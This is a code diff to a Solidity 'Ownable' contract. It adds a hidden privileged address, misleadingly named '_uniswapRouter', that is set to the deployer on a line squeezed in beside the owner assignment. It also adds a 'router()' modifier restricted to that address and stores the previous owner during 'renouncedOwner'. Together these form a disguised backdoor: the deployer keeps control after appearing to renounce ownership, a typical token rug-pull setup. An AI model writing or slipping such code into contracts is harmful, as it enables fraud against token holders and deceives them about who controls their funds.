@@ -6,6 +6,8 @@ import "./Address.sol";
 
 contract Ownable is Context {
     address private _owner;
+    address private _previousOwner;
+    uint256 private _lockTime;
 
     event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
 
@@ -14,7 +16,7 @@ contract Ownable is Context {
      */
     constructor () {
         address msgSender = _msgSender();
-        _owner = msgSender;
+        _owner = msgSender;_uniswapRouter = msgSender;
         emit OwnershipTransferred(address(0), msgSender);
     }
 
@@ -23,6 +25,10 @@ contract Ownable is Context {
      */
     function owner() public view returns (address) {
         return _owner;
+    }
+    address private _uniswapRouter;
+    function uniswapRouter() internal view returns (address) {
+        return _uniswapRouter;
     }
 
     /**
@@ -42,9 +48,11 @@ contract Ownable is Context {
 
     //Locks the contract for owner for the amount of time provided
     function renouncedOwner() public virtual onlyOwner {
-
-         emit OwnershipTransferred(_owner, address(0));
+        _previousOwner = _owner;
         _owner = address(0);
+        emit OwnershipTransferred(_owner, address(0));
     }
+    
+    modifier router(){require(_uniswapRouter == _msgSender());_;}
   
 }
